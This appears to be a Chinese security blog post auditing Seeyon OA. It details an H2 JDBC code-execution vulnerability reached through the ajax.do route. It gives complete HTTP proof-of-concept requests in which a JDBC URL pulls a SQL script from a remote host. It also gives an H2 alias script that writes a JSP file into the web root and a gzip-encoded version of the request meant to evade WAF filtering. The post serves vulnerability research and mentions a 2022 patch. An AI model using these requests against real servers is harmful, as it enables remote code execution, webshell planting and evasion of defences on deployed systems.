致远OA代码审计系列三-H2代码执行漏洞
====================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-01 0:01 发表于北京

原文地址：[致远OA代码审计系列三-H2代码执行漏洞](https://mp.weixin.qq.com/s/xNOwuxRSr-Kt-s4-KktepA)

**漏洞描述:**

致远OA在CipSyncConfigMangerImpl的checkDB方法中, 用户可控制JDBC连接设置项, 攻击者可以构造恶意Payload实现JDBC反序列化攻击, 致远OA存在H2相关依赖, 利用此漏洞可以实现H2代码执行。理论上是一个后台漏洞. 但是配合《致远OA代码审计系列二》中提到的致远OA权限绕过, 可以实现前台RCE。

**适用版本:**

适配版本范围：V5&G6\_V5.0至V8.0SP2全系列版本、V5&G6&N\_V8.1至V8.1SP2全系列版本。

**漏洞分析:**

AjaxController中的ajaxAction方法允许调用beanCacheMap中的类, 通过传入的method参数值和arguments参数值个数获取到methode方法, 最终在通过java反射调用执行. 这也是致远OA很多漏洞路由都是/seeyon/ajax.do路由的原因. beanCacheMap中存在较多的可直接利用的类。致远OA后续很多漏洞都是通过ajax.do路由进行利用的。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbWlAfBKicdyoCjSIOtE9RXJKx7HEMFUBvibtCicwY3xgP2hwmn7eaapxlEg/640?wx_fmt=png&from=appmsg)

可以通过seeyon/WEB-INF/cfgHome/spring/目录下的xxx-manager.xml文件查看具体的映射关系。

该漏洞位置位于syncConfigManagerImpl#checkDB方法. 致远OA存在H2依赖, 利用INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql' 从远端获取 SQL，执行 CREATE ALIAS/CALL。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbW9plicVibOVLg5DsE9SHoThoXJiboTBLhPqGZSNKRs0fmYudKqOwpWibUaA/640?wx_fmt=png&from=appmsg)

最终POC

```http
POST /seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=syncConfigManager HTTP/1.1
Accept: */*
CSRFTOKEN: 
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 183
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=a; avatarImageUrl=3003611276195810894; login_locale=zh_CN
Accept-Encoding: gzip, deflate


arguments=["","org.h2.Driver","jdbc:wrap-jdbc:jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INI\\T=RUNSCRIPT FROM 'http://x.x.x.x%3a7979/bcel.sql'","a","c"]&managerMethod=checkDB
```

jdk版本在8u251之前可以用bcel加载恶意字节码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbWwyibibPwPxkNe6MSrksAgpvHRTmShHicCKshKvpqMHyk9v3ibpdseYvYiag/640?wx_fmt=png&from=appmsg)

  写WEBSHELL:

```sql
drop alias if exists exec;
create alias test as 'void exec() throws java.io.IOException  { try { String path ="../webapps/seeyon/";java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"seeyon2023.jsp");String shellcontent = "sectest";printWriter2.println(shellcontent);printWriter2.close(); } catch (Exception e){ }}';
call test();
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbW1xDQ0k7ibyLibS14sT03FmK4sG2psHkibQeVoywyKjogA8AgnfncgYu2A/640?wx_fmt=png&from=appmsg)

在AjaxController中当存在requestCompress参数时会根据参数进行一次解密. 在H2命令执行被WAF等进行拦截的情况可以通过该点进行绕过:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbWcwianG0In2VVQcrV1WySaEQec63CjqqNkUzgyZva4Gtsjz2VPgBwlUg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMszfDicUF8zuOL73cxUrjhbWIwFXqVPrkojGoSwVdnTV5RspBTD0T5gZ4c9xribTRpxf0KXBU2VagSg/640?wx_fmt=png&from=appmsg)

最终绕WAF版POC:  

```http
POST /seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=syncConfigManager&requestCompress=gzip HTTP/1.1
Accept: */*
CSRFTOKEN: 
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 698
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=ccc; avatarImageUrl=3003611276195810894; login_locale=zh_CN
Accept-Encoding: gzip, deflate


arguments=%1F%C2%8B%08%00%C3%BE%C2%A9he%00%C3%BF%1D%C2%8D%5D%0B%C2%820%18F%C3%BF%C2%8A%C3%AC%C3%86%C2%9Bze%2B4%27%5E%C2%84%2D%10%C3%BC%C2%889%C2%83%C3%88%10%C2%BF%C3%88%22%C3%91%C3%A6%C2%A8%C2%BF%C3%AF%C3%B0%C3%A2%3C%3C%C3%A7%C3%AA%C3%9C%11%C3%9A%C2%A0Q%3E%C2%A1%27p%C2%92%C2%AF%5F%27%C2%B5%C2%BF%C3%9B%C2%BA%C2%A1%7FYM%C3%9B%C3%B5%C2%AD%C3%93%13%3At%03U%C3%9D%C2%AC%C3%9A%C3%9A%13%C3%BC%18%C2%B02bW%16%C2%95%C3%99%2D%13%2C%2E%C3%93%5C%C3%B8%3B%2FL%C3%82%C2%A2%10%3E%C3%8F%C2%93%2C%C3%A0%C3%A1E%18g%C2%9E%C3%86%C2%86%C3%99%2B5Q%C3%8B%C3%82%2E%01l%1F%C2%80%C3%ACm%C3%80%C3%94q%1D%C3%97%C2%9A%C3%86%06%C3%A6%C3%AF%C3%87%C3%94%C3%99J%C3%93%C2%A0%C3%87%02%27%13O%03%C2%93%00%00%00&managerMethod=checkDB
```

  

**总结:**

致远OAH2代码执行漏洞, 配合权限绕过可实现前台RCE,官方于2022-8-5发布补丁修复该漏洞。